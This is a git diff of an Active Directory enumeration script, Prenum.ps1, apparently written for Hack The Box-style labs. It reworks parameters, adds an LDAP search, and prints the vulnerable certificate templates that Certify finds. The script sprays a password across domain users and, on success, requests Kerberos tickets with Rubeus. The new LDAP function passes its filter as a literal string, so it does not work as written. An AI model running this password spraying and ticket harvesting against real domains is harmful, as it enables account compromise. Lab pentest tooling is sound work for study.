@@ -24,17 +24,17 @@ are ticked, or computer-accounts are created with other tools.
 .PARAMETER Domain
  FQDN Domain name
 
-.PARAMETER Users
-  Test user-accounts by setting it to true
+.PARAMETER Users [Switch]
+  Test user-accounts
 
-.PARAMETER Computers
-  Test computer-accounts by setting it to true
+.PARAMETER Computers [Switch]
+  Test computer-accounts 
 
 .PARAMETER Spraypass
-  Password for Passwordspraying. 
+  Password for Passwordspraying. (Needs -Users switch)
 
-.PARAMETER TestCA
-  Test CA for vulnerable certificate templates by setting parameter to true
+.PARAMETER TestCA [Switch]
+  Test CA for vulnerable certificate templates
 
 .PARAMETER Certify
   Run Certify command
@@ -42,11 +42,14 @@ are ticked, or computer-accounts are created with other tools.
 .PARAMETER Rubeus
   Run Rubeus command
 
+.PARAMETER Ldap
+  Run LDAP Search
+
 .EXAMPLE
 
 Enumerate users, computers and passwordspraying
 
-   .\Prenum.ps1' -DC menhit -Domain windcorp.htb -Users true -Computers true -Spraypass 'WelcomeToWindcorp#2023'
+   .\Prenum.ps1' -DC menhit -Domain windcorp.htb -Users -Computers -Spraypass 'WelcomeToWindcorp#2023'
 
    Output:
     Testing Computers
@@ -78,23 +81,26 @@ Action: Triage Kerberos Tickets (Current User)
   
 #>
 
+[CmdletBinding(DefaultParametersetName='None')]
 param(
-  [Parameter(Mandatory=$false)]
+  [Parameter(ParameterSetName='ldap',Mandatory=$true)]
   [string]$DC,
-  [Parameter(Mandatory=$false)]
+  [Parameter(ParameterSetName='ldap',Mandatory=$true)]
   [string]$Domain,
-  [Parameter(Mandatory=$false)]
+  [Parameter(ParameterSetName='ldap',Mandatory=$false)]
   [string]$Spraypass,
+  [Parameter(ParameterSetName='ldap',Mandatory=$false)]
+  [switch]$Users,
+  [Parameter(ParameterSetName='ldap',Mandatory=$false)]
+  [switch]$Computers,
   [Parameter(Mandatory=$false)]
-  [string]$Users,
-  [Parameter(Mandatory=$false)]
-  [string]$Computers,
-  [Parameter(Mandatory=$false)]
-  [string]$TestCA,
-  [Parameter(Mandatory=$false)]
+  [switch]$TestCA,
+  [Parameter(ParameterSetName='ldap',Mandatory=$false)]
   [string]$Rubeus,
   [Parameter(Mandatory=$false)]
-  [string]$Certify
+  [string]$Certify,
+  [Parameter(ParameterSetName='ldap',Mandatory=$false)]
+  [string]$Ldap
 )
 
 
@@ -186,8 +192,9 @@ Function Test-Users {
       } 
 
         if ($Spraypass) {
+          
           $valid = Test-ADAuthentication -username $_ -password $Spraypass
-      
+          
           if ($valid) {
             write-host Pwned user: $_ using password: $Spraypass -ForegroundColor Cyan
             Load-Rubeus -command "asktgt /user:$_ /password:$Spraypass /outfile:$_.kirbi"
@@ -197,6 +204,15 @@ Function Test-Users {
       } 
 }
 
+Function Ldap-Search ($filter){
+  $searcher.Filter = '$filter'
+  $results = $searcher.FindAll()
+
+}
+
+if ($Ldap) {
+  Ldap-Search $Ldap
+}
 
 
   if ($Computers) {
@@ -209,6 +225,8 @@ Function Test-Users {
   
   if ($TestCA) {
     Load-Certify -command "find /vulnerable /outfile:vulntemplates.txt"
+    Get-Content vulntemplates.txt
+    write-host "Saved in file: vulntemplates.txt"
   }
  
   if ($Certify) {
